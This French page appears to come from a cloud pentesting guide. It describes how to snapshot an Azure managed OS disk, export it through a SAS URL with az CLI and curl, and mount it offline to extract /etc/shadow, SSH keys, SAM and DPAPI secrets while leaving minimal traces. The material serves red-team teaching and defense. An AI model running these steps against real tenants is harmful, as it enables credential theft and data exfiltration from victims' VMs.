---
title: "Snapshots de disque : exporter un disque managé pour le lire hors ligne"
order: 3
description: "Créer et exporter des snapshots de disque managé Azure pour lire le disque OS d'une VM hors ligne."
keywords:
  - disk snapshot
  - managed disk
  - OS disk
  - export
  - offline read
---

# Snapshots de disque

Un disque managé contient les volumes OS et de données d'une VM, y compris ses secrets, ses clés SSH et ses credentials stockés. Avec des droits sur les ressources compute ou disque (`Microsoft.Compute/disks/*`, `Microsoft.Compute/snapshots/*`), vous prenez un snapshot du disque d'une cible et exportez le snapshot vers un VHD téléchargeable, lisant l'intégralité du système de fichiers hors ligne sans jamais toucher à la VM en cours d'exécution.

## Snapshot et export

```bash
# snapshot the target's OS disk
az snapshot create -g rg -n loot-snap --source <os-disk-id>

# mint a time-limited download URL (SAS) for the snapshot VHD
az snapshot grant-access -g rg -n loot-snap --duration-in-seconds 3600 \
  --query accessSas -o tsv

# download the VHD, then mount it read-only on a box you control
curl -o disk.vhd "<accessSas>"
```

## Notes d'exploitation

- `grant-access` renvoie une SAS vers le VHD brut : vous n'attachez donc jamais le disque dans l'abonnement cible et laissez une trace minimale côté compute ; le snapshot et l'octroi d'accès sont les seuls événements.
- Montez le VHD en lecture seule et extrayez `/etc/shadow`, `/root/.ssh`, `/home/*/.azure` et la configuration applicative ; sur les disques Windows, la SAM, la ruche SYSTEM et les masters DPAPI.
- Un snapshot peut être copié vers un compte de stockage ou un autre abonnement que vous contrôlez, pour une analyse sans contrainte de temps.
- Les modules `Get-AzPasswordsREST` et l'outillage de disque de MicroBurst automatisent le flux snapshot-puis-extraction.

## Outils

- **az CLI** (`snapshot create`, `snapshot grant-access`) : l'export.
- **MicroBurst** (modules de type `Get-AzureDiskExport`) : export de disque automatisé et analyse hors ligne.
- **libguestfs / guestmount** : monter le VHD en lecture seule pour le pillage.

## Références

- [HackTricks Cloud: Azure VMs and disks](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/az-virtual-machines.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: export a managed disk snapshot](https://learn.microsoft.com/azure/virtual-machines/scripts/create-vm-from-snapshot)
